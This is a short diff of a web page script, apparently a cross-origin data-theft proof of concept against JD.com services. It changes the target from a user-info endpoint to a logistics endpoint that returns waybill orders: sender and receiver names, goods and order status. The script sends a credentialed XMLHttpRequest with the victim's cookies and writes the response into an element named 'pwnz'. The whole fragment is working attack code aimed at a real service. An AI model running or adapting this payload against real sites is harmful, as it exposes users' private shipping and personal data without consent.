@@ -15,7 +15,7 @@
 		xhttp.onreadystatechange = function() {
 			if (this.readyState == 4 && this.status == 200) {
 				document.getElementById("pwnz").innerHTML = this.responseText; }   };   
-		xhttp.open("POST", "https://personal-cert.jd.com/api/user/info", true);
+		xhttp.open("POST", "https://proxy.jdwl.com/order/findWaybillOrdersByReceiveMobile", true);
 		xhttp.withCredentials = true;
-		xhttp.send(); } 
+		xhttp.send('["$cooMrdGatewayUid$",[{"name":"sEcho","value":1},{"name":"iColumns","value":8},{"name":"sColumns","value":",,,,,,,"},{"name":"iDisplayStart","value":0},{"name":"iDisplayLength","value":10},{"name":"mDataProp_0","value":"waybillCode"},{"name":"mDataProp_1","value":"senderName"},{"name":"mDataProp_2","value":"receiverName"},{"name":"mDataProp_3","value":"goodName"},{"name":"mDataProp_4","value":"weight"},{"name":"mDataProp_5","value":"statusId"},{"name":"mDataProp_6","value":"submitOrderTime"},{"name":"mDataProp_7","value":"status"}]]'); } 
 	</script>
